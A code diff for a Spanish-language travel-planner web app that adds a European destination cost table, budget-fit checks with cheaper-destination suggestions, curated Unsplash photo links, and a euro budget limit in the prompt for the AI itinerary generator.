+  'Tesalónica':   {f:[90,180],h:[55,120],c:35,t:10,note:'Mucho mejor que Atenas y más barata'},
+  // Croatia
+  'Dubrovnik':    {f:[90,220],h:[90,200],c:45,t:12,note:'Masificada en verano, mejor sept/oct'},
+  'Split':        {f:[80,180],h:[70,160],c:40,t:12,note:'Mejor base que Dubrovnik'},
+  'Zagreb':       {f:[70,160],h:[60,130],c:35,t:10,note:'Muy subestimada, barata y bonita'},
+  // Czech Republic
+  'Praga':        {f:[80,170],h:[55,130],c:30,t:10,note:'Vuelo ~3h, muy barata para Europa Central'},
+  // Hungary
+  'Budapest':     {f:[80,170],h:[55,120],c:30,t:10,note:'De las mejores relaciones calidad-precio de Europa'},
+  // Poland
+  'Cracovia':     {f:[80,170],h:[45,100],c:25,t:8,note:'Increíblemente barata, historia brutal'},
+  // Iceland
+  'Reikiavik':    {f:[120,280],h:[120,280],c:70,t:30,note:'Cara pero ningún sitio es igual'},
+  // Turkey
+  'Estambul':     {f:[90,200],h:[50,140],c:25,t:10,note:'Enorme valor — poco comparable en Europa'},
+  'Capadocia':    {f:[110,250],h:[60,200],c:25,t:20,note:'Globos aerostáticos incluidos'},
+};
+
+function getDestData(destName){
+  if(!destName) return null;
+  const n = destName.trim();
+  // Exact match first, then partial
+  if(DEST_DB[n]) return DEST_DB[n];
+  const key = Object.keys(DEST_DB).find(k=>k.toLowerCase()===n.toLowerCase()||n.toLowerCase().includes(k.toLowerCase())||k.toLowerCase().includes(n.toLowerCase()));
+  return key ? DEST_DB[key] : null;
+}
+
+function calcBudget(destData, days, pax, budgetTotal){
+  if(!destData) return null;
+  const nights = Math.max(1, days-1);
+  let flightMin, flightMax;
+  if(destData.road){
+    // Road trip: car rental cost per day × days, shared between pax
+    const carMin = (destData.car?.[0]||30)*days;
+    const carMax = (destData.car?.[1]||60)*days;
+    const ferryMin = (destData.ferry?.[0]||0)*pax;
+    const ferryMax = (destData.ferry?.[1]||0)*pax;
+    flightMin = destData.f[0]*pax + carMin + ferryMin;
+    flightMax = destData.f[1]*pax + carMax + ferryMax;
+  } else {
+    flightMin = destData.f[0]*pax;
+    flightMax = destData.f[1]*pax;
+  }
+  const hotelMin = destData.h[0]*nights;
+  const hotelMax = destData.h[1]*nights;
+  const foodMin = destData.c*0.7*days*pax;
+  const foodMax = destData.c*1.4*days*pax;
+  const totalMin = flightMin+hotelMin+foodMin;
+  const totalMax = flightMax+hotelMax+foodMax;
+  return {flightMin,flightMax,hotelMin,hotelMax,foodMin,foodMax,totalMin,totalMax,nights,note:destData.note,isRoad:!!destData.road};
+}
+
+function checkBudget(){
+  const panel = document.getElementById('budgetCheckPanel');
+  if(!panel) return;
+  const budgetVal = parseFloat(document.getElementById('budgetAmount').value);
+  const budgetPer = document.getElementById('budgetPer').value;
+  const dest = destSuggestMode ? '' : document.getElementById('dest').value.trim();
+  const tKey = document.getElementById('travelers').value;
+  const pax = {solo:1,couple:2,friends:4,family:3}[tKey]||1;
+  const budgetPerPax = budgetPer==='total' ? budgetVal/pax : budgetVal;
+  const budgetTotal = budgetPerPax*pax;
+  const dur = document.getElementById('durationSelect');
+  const days = dur ? parseInt(dur.value) : 7;
+
+  panel.className='budget-check';
+
+  if(!budgetVal || budgetVal<50){ panel.classList.remove('show'); return; }
+
+  if(destSuggestMode || !dest){
+    // Suggest destinations that fit
+    const fits = Object.entries(DEST_DB).filter(([name,d])=>{
+      const c = calcBudget(d,days,pax,budgetTotal);
+      return c && c.totalMin <= budgetTotal;
+    }).sort(([,a],[,b])=>{
+      const ca=calcBudget(a,days,pax,budgetTotal), cb=calcBudget(b,days,pax,budgetTotal);
+      return (budgetTotal-ca.totalMin)-(budgetTotal-cb.totalMin);
+    }).slice(0,6);
+
+    if(fits.length===0){
+      panel.innerHTML=`<div class="bc-title" style="color:#b45309">${t('budgetWarnTitle')}</div><div class="bc-breakdown">Con €${Math.round(budgetTotal)} para ${days} días y ${pax} persona${pax>1?'s':''} es difícil cubrir vuelos + hotel + comida en la mayoría de destinos europeos. Prueba con más días menos costosos, como Budapest o Cracovia.</div>`;
+      panel.classList.add('show','warn');
+      return;
+    }
+
+    const altsHTML = fits.map(([name,d])=>{
+      const c = calcBudget(d,days,pax,budgetTotal);
+      const remaining = Math.round(budgetTotal - c.totalMin);
+      return `<div class="bc-alt" onclick="selectDest('${name}')"><span class="bc-alt-name">${name}</span><div style="text-align:right"><span class="bc-alt-detail">${d.note}</span><br><span style="font-size:.7rem;color:#4a7c59;font-weight:700">desde ~€${Math.round(c.totalMin/pax)}pp · te sobran ~€${remaining}</span></div></div>`;
+    }).join('');
+
+    panel.innerHTML=`<div class="bc-title">${t('budgetSuggestTitle')} — €${Math.round(budgetPerPax)}pp · ${days} días</div><div class="bc-alts">${altsHTML}</div>`;
+    panel.classList.add('show','ok');
+    return;
+  }
+
+  // Check specific destination
+  const destData = getDestData(dest);
+  if(!destData){ panel.classList.remove('show'); return; }
+  const c = calcBudget(destData, days, pax, budgetTotal);
+  if(!c){ panel.classList.remove('show'); return; }
+
+  const fits = c.totalMin <= budgetTotal;
+  const tight = c.totalMax > budgetTotal && c.totalMin <= budgetTotal;
+
+  const flightLine = destData.f[0]===0 && !destData.road ? 'Sin vuelo (origen)' : `${c.isRoad?'🚗 Coche/vuelo+coche':'✈️ Vuelo'} ~€${c.flightMin}–€${c.flightMax}`;
+  const breakdown = `<div class="bc-breakdown">
+    <b>${flightLine}</b> · Hotel ~€${c.hotelMin}–€${c.hotelMax} (${c.nights}n) · Comida ~€${Math.round(c.foodMin)}–€${Math.round(c.foodMax)}<br>
+    <b>Total estimado: ~€${Math.round(c.totalMin)}–€${Math.round(c.totalMax)}</b> para ${pax} persona${pax>1?'s':''}<br>
+    <span style="color:${fits?'#4a7c59':'#b45309'}">${fits?(tight?'⚠️ Ajustado — reserva con antelación':'✓ Cabe en tu presupuesto'):'✗ Puede quedarse corto'}</span>
+    ${destData.note?`<br><span style="color:var(--ink2);font-size:.7rem">${destData.note}</span>`:''}
+  </div>`;
+
+  if(fits){
+    panel.innerHTML=`<div class="bc-title" style="color:#4a7c59">${t('budgetOkTitle')}</div>${breakdown}`;
+    panel.classList.add('show','ok');
+  } else {
+    // Suggest cheaper alternatives
+    const cheaper = Object.entries(DEST_DB).filter(([name,d])=>{
+      const cc=calcBudget(d,days,pax,budgetTotal);
+      return cc && cc.totalMin<=budgetTotal && name!==dest;
+    }).slice(0,3);
+    const altsHTML = cheaper.length>0 ? `<div style="font-size:.72rem;color:var(--ink2);margin-top:.5rem;font-weight:700">Alternativas que sí caben:</div><div class="bc-alts">${cheaper.map(([name,d])=>{
+      const cc=calcBudget(d,days,pax,budgetTotal);
+      return `<div class="bc-alt" onclick="selectDest('${name}')"><span class="bc-alt-name">${name}</span><span class="bc-alt-detail">desde ~€${Math.round(cc.totalMin/pax)}pp</span></div>`;
+    }).join('')}</div>` : '';
+    panel.innerHTML=`<div class="bc-title" style="color:#b45309">${t('budgetWarnTitle')}</div>${breakdown}${altsHTML}<div class="bc-warn-cta" onclick="forceGen()">${t('budgetWarnCta')}</div>`;
+    panel.classList.add('show','warn');
+  }
+}
+
+function selectDest(name){
+  destSuggestMode=false;
+  const destInput=document.getElementById('dest');
+  const btn=document.getElementById('destSuggestBtn');
+  destInput.style.display='';
+  destInput.value=name;
+  btn.classList.remove('on');
+  btn.textContent=t('destSuggestBtn');
+  checkBudget();
+}
+
+let forceGenerate=false;
+function forceGen(){forceGenerate=true;gen();}
+
+// Wire up live budget check
+document.addEventListener('DOMContentLoaded',()=>{
+  ['budgetAmount','budgetPer','dest','travelers','durationSelect'].forEach(id=>{
+    const el=document.getElementById(id);
+    if(el) el.addEventListener('change',checkBudget);
+    if(el && el.tagName==='INPUT') el.addEventListener('input',checkBudget);
+  });
+});
 
 // ═══════════════════════════════════
 // SAVED TRIPS — sistema robusto con ID permanente
@@ -1910,15 +2368,25 @@ async function loadExperiences(dest,travelers,budget,month,tKey){
   const wl=lang==='fr'?'French':lang==='en'?'English':'Spanish';
 
   // Photo keywords per experience type (Unsplash source)
-  const typePhotos={
-    tour:'travel,city,landmark',food:'food,restaurant,gastronomy',museum:'museum,art,gallery',
-    night:'nightlife,bar,cocktail',boat:'boat,sea,sailing',bike:'cycling,bicycle,travel',
-    cook:'cooking,kitchen,cuisine',hike:'hiking,mountain,nature',nature:'nature,landscape,park',
-  };
   function expPhoto(type,name,destName){
-    const kw=typePhotos[type]||'travel,landmark';
-    const seed=encodeURIComponent(name.slice(0,20)+destName);
-    return `https://source.unsplash.com/400x240/?${kw}&sig=${seed}`;
+    // Curated Unsplash photo IDs by experience type — these are stable and real
+    const photoMap={
+      tour:      ['photo-1527631746610-bca00a040d60','photo-1469854523086-cc02fe5d8800','photo-1476514525535-07fb3b4ae5f1'],
+      food:      ['photo-1414235077428-338989a2e8c0','photo-1504674900247-0877df9cc836','photo-1555396273-367ea4eb4db5'],
+      museum:    ['photo-1554907984-15263bfd63bd','photo-1566127992631-137a642a90f4','photo-1518998053901-5348d3961a04'],
+      night:     ['photo-1516450360452-9312f5e86fc7','photo-1533174072545-7a4b6ad7a6c3','photo-1470225620780-dba8ba36b745'],
+      boat:      ['photo-1544551763-46a013bb70d5','photo-1500375592092-40eb2168fd21','photo-1505118380757-91f5f5632de0'],
+      bike:      ['photo-1571068316344-75bc76f77890','photo-1558618666-fcd25c85cd64','photo-1473091534298-04dcbce3278c'],
+      cook:      ['photo-1466637574441-749b8f19452f','photo-1556909114-f6e7ad7d3136','photo-1507048331197-7d4ac70811cf'],
+      hike:      ['photo-1551632811-561732d1e306','photo-1500534314209-a25ddb2bd429','photo-1533240332313-0db49b459ad6'],
+      nature:    ['photo-1441974231531-c6227db76b6e','photo-1501854140801-50d01698950b','photo-1518173946687-a4c8892bbd9f'],
+      market:    ['photo-1488459716781-31db52582fe9','photo-1515443961218-a51367888e4b','photo-1534483509719-3feaee7c30da'],
+      art:       ['photo-1518998053901-5348d3961a04','photo-1541680670548-88e8cd23c0f4','photo-1578321272176-b7bbc0679853'],
+      local:     ['photo-1529156069898-49953e39b3ac','photo-1510525009512-ad7fc75f5078','photo-1516156008625-3a9d6067fab5'],
+    };
+    const photos=photoMap[type]||photoMap.tour;
+    const seed=Math.abs(name.split('').reduce((a,c)=>a+c.charCodeAt(0),0))%photos.length;
+    return`https://images.unsplash.com/${photos[seed]}?w=480&h=280&fit=crop&q=80&auto=format`;
   }
 
   const epersona={
@@ -2077,15 +2545,46 @@ function renderResult(s){
 // ═══════════════════════════════════
 async function gen(){
   const origin=document.getElementById('origin').value.trim()||'home';
-  const dest=document.getElementById('dest').value.trim();
-  if(!dest){const el=document.getElementById('dest');el.style.borderColor='#F87171';el.focus();el.addEventListener('input',()=>el.style.borderColor='',{once:true});return;}
+  let dest=document.getElementById('dest').value.trim();
 
+  // If in suggest mode and no dest selected yet, run checkBudget to show options
+  if(destSuggestMode && !dest){
+    checkBudget();
+    const panel=document.getElementById('budgetCheckPanel');
+    if(panel) panel.scrollIntoView({behavior:'smooth',block:'nearest'});
+    return;
+  }
+
+  if(!dest && !forceGenerate){
+    const el=document.getElementById('dest');
+    el.style.display='';
+    el.style.borderColor='#F87171';
+    el.focus();
+    el.addEventListener('input',()=>el.style.borderColor='',{once:true});
+    return;
+  }
+  forceGenerate=false;
+
+  // Read duration from selector OR date inputs
   const dfv=document.getElementById('df').value,dtv=document.getElementById('dt').value;
-  const days=dfv&&dtv?Math.max(1,Math.round((new Date(dtv)-new Date(dfv))/86400000)):7;
+  const durSel=document.getElementById('durationSelect');
+  const days=dfv&&dtv?Math.max(1,Math.round((new Date(dtv)-new Date(dfv))/86400000)):(durSel?parseInt(durSel.value):7);
+
   const tKey=document.getElementById('travelers').value,bKey=document.getElementById('budget').value;
   const styles=activeTags(),extra=document.getElementById('extra').value.trim();
   const tMap=t('travelerMap'),bMap=t('budgetMap');
   const tStr=tMap[tKey]||tKey,bStr=bMap[bKey]||bKey;
+
+  // Real budget in euros
+  const budgetAmountEl=document.getElementById('budgetAmount');
+  const budgetPerEl=document.getElementById('budgetPer');
+  const rawBudget=parseFloat(budgetAmountEl?.value)||0;
+  const budgetPer=budgetPerEl?.value||'person';
+  const numPax={solo:1,couple:2,friends:4,family:3}[tKey]||1;
+  const budgetPerPax=budgetPer==='total'?Math.round(rawBudget/numPax):rawBudget;
+  const budgetTotal=budgetPerPax*numPax;
+  const hasBudget=budgetTotal>0;
+  const budgetStr=hasBudget?`€${budgetPerPax}pp (€${budgetTotal} total para ${numPax} persona${numPax>1?'s':''})`:`${bStr}`;
 
   const btn=document.getElementById('genBtn');btn.disabled=true;
   document.getElementById('loadBox').classList.add('on');
@@ -2192,7 +2691,7 @@ TRIP:
 - Destination: ${dest}
 - Duration: ${days} days
 ${fechaStr?'- Dates: '+fechaStr:''}
-- Budget: ${bStr} (hotel ~€${br.hotel[0]}–${br.hotel[1]}/night, food ~€${br.food[0]}–${br.food[1]}/day/person, experiences ~€${br.exp[0]}–${br.exp[1]}/person)
+- Budget: ${budgetStr}${hasBudget?` — HARD LIMIT: el itinerario completo NO debe superar €${budgetTotal} total para ${numPax} persona${numPax>1?'s':''}. Si el destino es caro para este presupuesto, dilo honestamente en BUDGET_MATCH y optimiza cada elección para mantenerse dentro.`:`(hotel ~€${br.hotel[0]}–${br.hotel[1]}/night, food ~€${br.food[0]}–${br.food[1]}/day/person, experiences ~€${br.exp[0]}–${br.exp[1]}/person)`}
 - Style: ${styles}
 ${extra?'- Traveller notes: '+extra:''}
 ${flexNote?'- '+flexNote:''}
@@ -2358,7 +2857,7 @@ Max 1000 words. Write entirely in ${wl}.`;
     const chipsHTML=`
       ${dfv?`<div class="chip"><div class="chip-l">${t('labelDepart')}</div><div class="chip-v">${fmtD(dfv)}</div></div>`:''}
       <div class="chip"><div class="chip-l">${t('labelTravelers')}</div><div class="chip-v">${tStr}</div></div>
-      <div class="chip"><div class="chip-l">${t('labelBudget')}</div><div class="chip-v">${bStr}</div></div>
+      <div class="chip"><div class="chip-l">${t('labelBudgetAmount')||'Presupuesto'}</div><div class="chip-v">${hasBudget?`€${budgetPerPax}pp`:bStr}</div></div>
       <div class="chip"><div class="chip-l">${t('dayLabel').toLowerCase()}s</div><div class="chip-v">${days}</div></div>`;
 
     // ── Email save block + My trip block ──
